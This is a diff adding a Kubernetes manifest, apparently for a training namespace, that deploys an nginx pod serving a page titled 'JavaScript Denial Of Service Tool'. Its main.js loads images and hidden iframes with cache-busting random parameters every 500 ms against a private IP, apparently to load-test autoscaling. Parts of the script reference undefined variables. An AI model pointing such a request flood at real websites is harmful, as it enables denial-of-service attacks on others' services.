@@ -1,0 +1,76 @@
+---
+apiVersion: v1
+data:
+  index.html: "<!DOCTYPE html>\n\n<html>\n<head>\n  <title>JavaScript Denial Of Service
+    Tool</title>\n\n  <meta name=\"description\" content=\"A Tool For Attacking Websites
+    With JavaScript\">\n  <meta name=\"keywords\" content=\"JavaScript,DDOS,DOS,Tool,
+    Denial Of Service\">\n  <meta name=\"viewport\" content=\"width=device-width,
+    initial-scale=1.0\">\n  \n</head>\n\n<body>\n\n  <script src=\"main.js\"></script>
+    \n</body>\n</html>\n"
+  main.js: "var target = \"http://10.122.7.100:30010/\"\nvar speed = 500\nvar msg
+    = \"TEST\"\n\nfunction attack() {  \n  var pic = new Image();\n  var rand1 = Math.floor(Math.random()
+    * 99999999999999999999999999999999999999999999);\n  var rand2 = Math.floor(Math.random()
+    * 99999999999999999999999999999999999999999999);\n  pic.src = 'http://'+target+\"/?r=\"+rand1;\n
+    \   \n    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache=\"'+rand1+
+    +' &msg= '+ msg + '\"style=\"display:none;\"></iframe>';\n  \n\n                    img.onload
+    = function () { onSuccess(rID); }; // TODO: it may never happen if target URL
+    is not an image... // but probably can be fixed with different methods\n\t\t\t\t\timg.setAttribute(\"src\",
+    targetURL + \"?killinAllThatCacheYeah=\" + rand2 + \"&msg=\" + msg);\n\n}\nsetInterval(attack,
+    speed);  \n"
+kind: ConfigMap
+metadata:
+  name: source
+  namespace: szkolenie
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name:  hpa-ddos
+  namespace: szkolenie
+spec:
+  selector:
+    app:  hpa-ddos
+  type:  ClusterIP
+  ports:
+  - name:  http
+    port:  80
+    targetPort:  80
+---
+apiVersion: extensions/v1beta1
+kind: Ingress
+metadata:
+  namespace: szkolenie
+  name: hpa-ddos
+  annotations:
+    nginx.ingress.kubernetes.io/rewrite-target: /
+spec:
+  rules:
+  - host: hpa.k8s.dc0
+    http:
+      paths:
+      - path: /
+        backend:
+          serviceName: hpa-ddos
+          servicePort: 80
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  namespace: szkolenie
+  name: hpa-ddos
+  labels:
+    app: hpa-ddos
+spec:
+  containers:
+  - name: nginx
+    image: nginx
+    imagePullPolicy: IfNotPresent
+    ports:
+    - containerPort: 80
+    volumeMounts:
+    - name: source
+      mountPath: /usr/share/nginx/html
+  volumes:
+  - name: source
+    configMap:
+      name: source
